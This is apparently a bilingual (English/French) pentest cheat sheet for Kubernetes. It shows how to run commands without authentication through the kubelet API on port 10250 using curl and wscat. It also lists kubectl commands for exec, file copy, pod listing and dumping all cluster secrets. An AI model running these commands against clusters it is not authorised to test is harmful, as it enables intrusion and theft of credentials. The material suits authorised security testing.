Kubernetes
==========

## API
The Kubernetes API exposes the port `10250`. This API can be used to interact with the Kubernetes engine which basically give us the right to do anything you desire unauthenticated.

To confirm that the host is running Docker you can make a GET requests to `/pods` :

```
https://<host>:<port>/pods

{"kind":"PodList","apiVersion":"v1","metadata":{},"items":[{"metadata":{"name":"dind-sgz8n","generateName":"dind-","namespace":"default","selfLink":"/api/v1/namespaces/default/pods/dind-sgz8n",`...}],"qosClass":"BestEffort"}}]}
```

With the above information it's possible to send requests to the API to execute commands:
```bash
$ curl --insecure -v -H "W-Stream-Protocol-Version: v2.channel.k8s.io" -H "X-Stream-Protocol-Version: channel.k8s.io" -H "Connection: upgrade" -H "Upgrade: SPDY/3.1" -X POST "https://<host>:<port>/exec/<namespace>/<pod_name>/<container_name>?command=<cmd>&input=1&output=1&tty=1"
```

In the response, there is a `Location` header to create a WebSocket connection:
```bash
$ wscat -c "https://<host>:<port>/<location_header>" --no-check
```


## Lancer un pod qui se supprime automatiquement à la fin
```bash
$ kubectl run k8s-2-test -ti --rm --image=debian --generator=run-pod/v1
```

## S'attacher à un pod existant
```bash
$ kubectl exec -it k8s-2-test -- /bin/bash
```

## Se connecter à une session existante
```bash
$ kubectl attach k8s-1-test -c k8s-1-test -i -t
```

## Copier un fichier d'un pod à sa machine
```bash
$ kubectl cp default/k8s-1-test:results.nmap ./result_nmaps_banner
```

## Afficher les services (format simple à traiter)
```bash
$ kubectl get services (-o wide)
```

## Afficher les pods (json)
```bash
$ kubectl get pods -o json
```

## Afficher les pods (format simple à traiter)
```bash
$ kubectl get pods -o wide
## Get IP list
$ kubectl get pods -o wide | sed -e 's/\s\+/ /g' | cut -f6 -d " "
```

## Afficher l'ensemble des secrets
```bash
$ kubectl get secrets -o yaml
```
